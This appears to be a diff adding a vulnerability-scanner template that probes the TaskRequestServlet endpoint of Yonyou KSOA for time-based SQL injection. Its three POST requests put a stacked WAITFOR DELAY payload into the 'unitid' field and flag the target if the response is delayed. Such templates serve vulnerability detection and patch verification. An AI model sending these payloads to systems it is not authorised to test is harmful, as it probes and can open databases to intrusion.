@@ -1,0 +1,51 @@
+id: yonyou-ksoa-taskrequestservlet-sqli
+info:
+  name: 用友 KSOA taskrequestservlet 接口 - SQL 注入漏洞
+  author: secking
+  severity: high
+  reference:
+    - https://www.yonyou.com/
+  metadata:
+    verified: true
+    max-request: 3
+    vendor: yonyou
+    product: ksoa
+  tags: sqli,vuln,yonyou,ksoa
+variables:
+  sleepSecond1: '{{rand_int(6, 8)}}'
+  sleepSecond2: '{{rand_int(3, 5)}}'
+flow: http(1) && http(2) && http(3)
+http:
+  - method: POST
+    path:
+      - '{{BaseURL}}/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: unitid=1%27%3bWAITFOR%20DELAY%20%270:0:0%27--%20&password=
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+  - method: POST
+    path:
+      - '{{BaseURL}}/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: unitid=1%27%3bWAITFOR%20DELAY%20%270:0:{{sleepSecond1}}%27--%20&password=
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && duration * 1000 - r0latency >= sleepSecond1 * 1000 - 1000'
+  - method: POST
+    path:
+      - '{{BaseURL}}/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet'
+    redirects: false
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: unitid=1%27%3bWAITFOR%20DELAY%20%270:0:{{sleepSecond2}}%27--%20&password=
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200 && duration * 1000 - r0latency >= sleepSecond2 * 1000 - 1000'
